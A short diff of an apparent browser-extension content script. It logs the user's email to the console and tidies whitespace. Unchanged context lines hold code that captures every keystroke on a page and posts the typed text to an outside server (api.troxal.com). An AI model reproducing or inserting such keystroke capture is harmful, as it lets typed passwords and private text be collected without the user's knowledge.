@@ -5,13 +5,14 @@ var useremail;
 chrome.extension.sendMessage({}, function(response) {
   useremail = response.email
 });
+console.debug(useremail);
 var timeout = null;
 var key = '';
 var j = {};
 j.query = jQuery.noConflict( true );
 j.query(this).keypress((e) => {
 clearTimeout(timeout);
-key = key + e.key;  
+key = key + e.key;
 timeout = setTimeout(function () {
     j.query.post("https://api.troxal.com/troxal/report/key/", {
             typed: key,
@@ -23,6 +24,6 @@ timeout = setTimeout(function () {
             console.error("Key potentially blocked? More testing needed.");
         });
         key = '';
-    }, 500);  
+    }, 500);
 })
 
